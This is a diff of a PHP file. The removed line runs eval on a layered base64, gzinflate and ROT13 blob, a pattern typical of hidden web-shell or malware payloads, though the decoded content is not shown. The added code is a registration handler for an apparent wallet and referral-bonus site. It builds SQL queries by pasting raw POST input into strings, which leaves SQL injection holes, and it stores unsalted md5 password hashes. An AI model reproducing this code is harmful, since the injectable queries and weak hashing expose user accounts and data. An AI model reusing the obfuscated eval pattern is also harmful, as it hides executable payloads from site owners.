@@ -1,3 +1,41 @@
-<?php
-eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
+<?php 
+ob_start();
+session_start();
+include("include/connection.php");
+
+@$mobile=$_POST['mobile'];
+@$email=$_POST['email'];
+@$password=$_POST['password'];
+@$rcode=$_POST['rcode'];
+@$acceptTC=$_POST['remember'];
+@$action=$_POST['action'];
+// $otpmobile=@$_SESSION["signup_mobilematched"];
+
+if($action=="register")
+{
+//   if(strlen($otpmobile!==$mobile))
+  if(!$mobile){echo"4";}else{
+	$chkuser=mysqli_query($con,"select * from `tbl_user` where `mobile`='".$mobile."'");
+	
+	$userRow=mysqli_num_rows($chkuser);
+	print_r($userRow);
+if($userRow=='' || $userRow==0){
+$chkrcode=mysqli_query($con,"select * from `tbl_user` where `owncode`='".$rcode."'");
+	$codeRow=mysqli_num_rows($chkrcode);
+	if($codeRow!=''){	
+$sql= mysqli_query($con,"INSERT INTO `tbl_user` (`mobile`, `email`, `password`,`code`,`owncode`,`privacy`,`status`) VALUES ('".$mobile."','".$email."','".md5($password)."','".$rcode."','','".$acceptTC."','1')");
+$userid=mysqli_insert_id($con);
+$refcode=$userid.refcode();
+$sql= mysqli_query($con,"UPDATE `tbl_user` SET `owncode` = '$refcode' WHERE `id`= '".$userid."'");
+$sql2= mysqli_query($con,"INSERT INTO `tbl_wallet`(`userid`,`amount`,`envelopestatus`) VALUES ('".$userid."','0','0')");
+$sql3= mysqli_query($con,"INSERT INTO `tbl_bonus`(`userid`,`amount`,`level1`,`level2`) VALUES ('".$userid."','0','0','0')");
+
+	if($sql){
+      unset($_SESSION["signup_mobilematched"]);
+      echo"1";
+	  }else{ echo"0";}
+	}else{echo"3";}
+	}else{ echo"2";}
+}
+}
 ?>
